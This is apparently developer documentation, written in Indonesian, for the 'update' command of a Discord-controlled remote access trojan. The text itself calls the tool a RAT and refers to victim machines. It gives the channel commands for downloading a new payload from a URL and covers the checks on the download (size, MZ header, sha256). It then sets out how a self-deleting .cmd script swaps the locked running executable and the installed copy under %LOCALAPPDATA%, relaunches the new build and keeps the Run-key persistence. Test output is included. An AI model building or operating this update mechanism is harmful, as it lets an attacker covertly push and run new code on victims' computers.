# `update` — ganti build yang sedang jalan

```powershell
python tools\test_update.py     # bukti mekanisme swap, tanpa Discord
```

## Di channel

```
!a update                        # laporan build yang jalan
!a update <url>                  # unduh, verifikasi, timpa, restart
!a update <url> <sha256>         # sama, tapi hash wajib cocok
```

Contoh laporan:

```
exe    : C:\Users\x\AppData\Local\Programs\payload.7z\payload.7z.exe
ukuran : 14586368 B
sha256 : 06a7c0627b36d01e41370c6c9070b94776541c18e741c49c58ed05062c6cebdc
install: C:\Users\x\AppData\Local\Programs\payload.7z\payload.7z.exe | sama
last   : [update] 2026-11-01 16:20:11 / [update] swap ok
```

## Kenapa tidak bisa langsung timpa

Windows mengunci image exe selama prosesnya hidup. `shutil.copy` ke file yang
sedang jalan selalu gagal `PermissionError`. Jadi urutannya:

```
unduh -> verifikasi -> tulis .cmd ke TEMP -> os._exit(0)
      -> .cmd menunggu lock lepas (retry 1 detik, 45x)
      -> copy /y -> start build baru -> hapus diri sendiri
```

## Verifikasi sebelum ada yang ditimpa

| cek | alasan |
|---|---|
| ukuran ≥ 4096 B | halaman error 404 dari GitHub juga "berhasil diunduh" |
| dua byte pertama `MZ` | build rusak yang menimpa RAT = mesin korban jadi bata |
| sha256 (opsional) | jaminan byte-per-byte, bukan cuma "kelihatan benar" |

Kalau salah satu gagal, file hasil unduhan dihapus dan **tidak ada satu pun
file yang tersentuh**. RAT lanjut jalan dengan build lama.

## Yang ditimpa

1. exe yang sedang jalan (`persist.self_path()` — di onefile ini proses induk)
2. salinan terpasang di `%LOCALAPPDATA%\Programs\<nama>\<nama>.exe`, kalau ada

Lalu yang dijalankan ulang adalah salinan terpasang. Run key tidak diubah —
targetnya sudah menunjuk ke sana.

## Hasil uji nyata

```
[*] tolak teks     : True (bukan PE (header bukan MZ))
[*] tolak kecil    : True (terlalu kecil (102 B))
[*] tolak sha salah: True (sha256 beda: dapat 06a7c0627b36d01e)
[*] terima sha benar: True (ok 14586368 B)
[*] exe jalan      : True
[*] masih terkunci : True (sha belum berubah)
[*] swap selesai   : True
[*] jalan lagi     : True
[*] skrip hapus diri: True
[+] semua uji update lolos
```

Uji ini menjalankan exe sungguhan (jadi file benar-benar terkunci), menulis
skrip swap, membuktikan file **tidak** berubah selama proses hidup, lalu
membunuh proses dan memastikan build baru terpasang dan jalan lagi.

## Yang belum diuji

Jalur lewat Discord (`!a update <url>`) belum pernah dieksekusi end-to-end:
`net.poll()` membuang pesan yang dikirim bot sendiri, jadi perintah ini harus
datang dari akun lu, bukan dari skrip uji. Yang sudah terbukti adalah seluruh
mekanisme di bawahnya — unduh, verifikasi, swap, restart.
